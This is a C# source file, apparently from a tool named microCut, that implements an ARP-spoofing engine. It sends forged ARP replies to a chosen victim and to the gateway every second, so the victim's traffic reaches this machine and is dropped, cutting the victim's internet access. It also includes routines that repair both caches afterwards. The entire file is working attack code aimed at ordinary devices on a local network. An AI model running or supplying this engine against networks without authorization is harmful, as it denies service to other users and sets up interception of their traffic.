using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using SharpPcap;
using microCut.Models;

namespace microCut.Services;

/// <summary>
/// Poisons ARP caches of a victim and the gateway. "Cut" works because this
/// machine receives the redirected frames and does not forward them (Windows
/// IP routing is off by default and microCut never relays) — the traffic is
/// simply dropped, severing the victim's internet access.
/// </summary>
public sealed class SpoofEngine : IDisposable
{
    private static readonly TimeSpan ResendInterval = TimeSpan.FromSeconds(1);

    private readonly ILiveDevice _device;
    private readonly PhysicalAddress _attackerMac;
    private readonly IPAddress _attackerIp;
    private readonly object _sendLock = new();
    private readonly object _sessionsLock = new();
    private readonly Dictionary<string, TargetSession> _sessions = new();

    public event Action<string>? Log;

    private sealed class TargetSession
    {
        public required NetworkDevice Victim { get; init; }
        public required NetworkDevice Gateway { get; init; }
        public required CancellationTokenSource Cts { get; init; }
        public Task? Loop { get; set; }
    }

    public SpoofEngine(ILiveDevice device, InterfaceInfo info)
    {
        _device = device;
        _attackerMac = info.Mac;
        _attackerIp = info.Ip;
        _device.Open(new DeviceConfiguration { Mode = DeviceModes.Promiscuous, ReadTimeout = 1000 });
    }

    public bool IsSpoofing(NetworkDevice victim)
    {
        lock (_sessionsLock)
            return _sessions.ContainsKey(victim.Ip);
    }

    /// <summary>Begins poisoning for one victim. Returns false if already active.</summary>
    public bool StartCut(NetworkDevice victim, NetworkDevice gateway)
    {
        lock (_sessionsLock)
        {
            if (_sessions.ContainsKey(victim.Ip))
                return false;
            var session = new TargetSession
            {
                Victim = victim,
                Gateway = gateway,
                Cts = new CancellationTokenSource()
            };
            session.Loop = Task.Run(() => SpoofLoop(session));
            _sessions[victim.Ip] = session;
        }

        victim.Status = DeviceStatus.Cut;
        Log?.Invoke($"Spoofing started for {victim.Ip} — internet cut.");
        return true;
    }

    private async Task SpoofLoop(TargetSession session)
    {
        CancellationToken ct = session.Cts.Token;
        try
        {
            while (!ct.IsCancellationRequested)
            {
                SendSpoofedReplies(session.Victim, session.Gateway);
                await Task.Delay(ResendInterval, ct);
            }
        }
        catch (OperationCanceledException) { }
        catch (Exception ex)
        {
            Log?.Invoke($"Spoofing error for {session.Victim.Ip}: {ex.Message}");
        }
        finally
        {
            RestoreTarget(session.Victim, session.Gateway);
            session.Victim.Status = DeviceStatus.Online;
        }
    }

    /// <summary>
    /// Stops poisoning a victim and repairs both ARP caches with the correct
    /// MAC mappings (the loop's finally block sends the corrective replies).
    /// </summary>
    public async Task StopCutAsync(NetworkDevice victim)
    {
        TargetSession? session;
        lock (_sessionsLock)
        {
            if (!_sessions.TryGetValue(victim.Ip, out session))
                return;
            _sessions.Remove(victim.Ip);
        }

        session!.Cts.Cancel();
        if (session.Loop != null)
            await session.Loop;
        session.Cts.Dispose();
        Log?.Invoke($"Restored {victim.Ip} — internet access re-enabled.");
    }

    /// <summary>Global kill switch: restores every currently cut device.</summary>
    public async Task RestoreAllAsync()
    {
        TargetSession[] sessions;
        lock (_sessionsLock)
        {
            sessions = _sessions.Values.ToArray();
            _sessions.Clear();
        }

        foreach (TargetSession session in sessions)
            session.Cts.Cancel();
        await Task.WhenAll(sessions.Select(s => s.Loop ?? Task.CompletedTask));
        foreach (TargetSession session in sessions)
            session.Cts.Dispose();

        if (sessions.Length > 0)
            Log?.Invoke("Global restore complete — all devices restored.");
    }

    private void SendSpoofedReplies(NetworkDevice victim, NetworkDevice gateway)
    {
        // Tell the victim: "the gateway's IP is at the attacker's MAC".
        SendArpResponse(gateway.IpAddress, _attackerMac, victim.MacAddress, victim.IpAddress);
        // Tell the gateway: "the victim's IP is at the attacker's MAC".
        SendArpResponse(victim.IpAddress, _attackerMac, gateway.MacAddress, gateway.IpAddress);
    }

    private void RestoreTarget(NetworkDevice victim, NetworkDevice gateway)
    {
        // Repeated corrective replies make the repair survive a lost frame.
        for (int i = 0; i < 4; i++)
        {
            SendArpResponse(gateway.IpAddress, gateway.MacAddress, victim.MacAddress, victim.IpAddress);
            SendArpResponse(victim.IpAddress, victim.MacAddress, gateway.MacAddress, gateway.IpAddress);
            Thread.Sleep(100);
        }
    }

    private void SendArpResponse(IPAddress spoofedIp, PhysicalAddress claimedMac, PhysicalAddress targetMac, IPAddress targetIp)
    {
        var arp = new ArpPacket(ArpOperation.Response, targetMac, targetIp, claimedMac, spoofedIp);
        var eth = new EthernetPacket(claimedMac, targetMac, EthernetType.Arp) { PayloadPacket = arp };

        lock (_sendLock)
        {
            try { _device.SendPacket(eth.Bytes); }
            catch (Exception ex) { Log?.Invoke($"Packet send failed: {ex.Message}"); }
        }
    }

    public void Dispose()
    {
        lock (_sessionsLock)
        {
            foreach (TargetSession session in _sessions.Values)
                session.Cts.Cancel();
            _sessions.Clear();
        }
        try { _device.Close(); } catch { }
    }
}
